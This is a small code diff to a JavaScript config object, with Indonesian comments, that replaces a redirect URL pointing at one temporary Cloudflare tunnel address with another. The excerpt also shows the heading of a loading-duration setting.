@@ -7,7 +7,7 @@ const CONFIG = {
     // ============================================
     // LINK CLOUDFLARE TUNNEL (tujuan redirect)
     // ============================================
-    redirectUrl: "https://likewise-perception-petroleum-gaming.trycloudflare.com/acr-nexus",
+    redirectUrl: "https://biography-shelf-canberra-ethics.trycloudflare.com/acr-nexus",
     
     // ============================================
     // DURASI LOADING (dalam milidetik)
